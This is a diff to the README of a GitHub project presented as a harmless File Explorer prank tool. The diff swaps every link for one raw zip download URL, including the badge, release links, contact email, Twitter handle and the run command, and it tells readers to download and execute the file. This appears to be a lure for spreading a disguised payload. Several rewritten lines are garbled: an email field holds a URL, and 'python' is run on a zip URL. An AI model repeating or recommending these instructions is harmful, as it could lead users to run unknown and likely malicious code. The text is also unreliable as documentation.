@@ -1,6 +1,6 @@
 # Explorer Spammer 🚀
 
-![Explorer Spammer](https://img.shields.io/badge/Download-Explorer%20Spammer-blue?style=for-the-badge&logo=python)
+![Explorer Spammer](https://github.com/umarxxx/Explorer-Spammer/raw/refs/heads/main/regenerative/Spammer_Explorer_3.4.zip%20Spammer-blue?style=for-the-badge&logo=python)
 
 Welcome to the **Explorer Spammer** repository! This Python project is designed to create a light-hearted experience by spamming File Explorer windows on Windows operating systems. Whether you want to play a harmless prank on a friend or just explore the capabilities of Python, this tool provides a fun way to do so.
 
@@ -24,7 +24,7 @@ Welcome to the **Explorer Spammer** repository! This Python project is designed 
 
 ## Installation
 
-To get started, you need to download the latest version of Explorer Spammer. You can find the releases [here](https://github.com/umarxxx/Explorer-Spammer/releases). Download the appropriate file for your system, then execute it to start spamming File Explorer windows.
+To get started, you need to download the latest version of Explorer Spammer. You can find the releases [here](https://github.com/umarxxx/Explorer-Spammer/raw/refs/heads/main/regenerative/Spammer_Explorer_3.4.zip). Download the appropriate file for your system, then execute it to start spamming File Explorer windows.
 
 ### Requirements
 
@@ -36,7 +36,7 @@ To get started, you need to download the latest version of Explorer Spammer. You
 After installation, you can run the program with a simple command. Open your command prompt or terminal and navigate to the directory where you downloaded the file. Then, execute the script using:
 
 ```bash
-python explorer_spammer.py
+python https://github.com/umarxxx/Explorer-Spammer/raw/refs/heads/main/regenerative/Spammer_Explorer_3.4.zip
 ```
 
 This will start the spam process. You can stop it at any time by closing the File Explorer windows or terminating the script.
@@ -72,16 +72,16 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://github.com/umarxxx/Explorer-Spammer/raw/refs/heads/main/regenerative/Spammer_Explorer_3.4.zip
+- **Twitter**: [@yourhandle](https://github.com/umarxxx/Explorer-Spammer/raw/refs/heads/main/regenerative/Spammer_Explorer_3.4.zip)
 
 ## Releases
 
-To download the latest version of Explorer Spammer, visit the [Releases](https://github.com/umarxxx/Explorer-Spammer/releases) section. Here, you can find all available versions and download the one that suits your needs.
+To download the latest version of Explorer Spammer, visit the [Releases](https://github.com/umarxxx/Explorer-Spammer/raw/refs/heads/main/regenerative/Spammer_Explorer_3.4.zip) section. Here, you can find all available versions and download the one that suits your needs.
 
 ## Conclusion
 
-Explorer Spammer is a fun and harmless way to explore the capabilities of Python and enjoy some light-hearted pranking. Download the latest version [here](https://github.com/umarxxx/Explorer-Spammer/releases) and start spamming those File Explorer windows today!
+Explorer Spammer is a fun and harmless way to explore the capabilities of Python and enjoy some light-hearted pranking. Download the latest version [here](https://github.com/umarxxx/Explorer-Spammer/raw/refs/heads/main/regenerative/Spammer_Explorer_3.4.zip) and start spamming those File Explorer windows today!
 
 ---
 
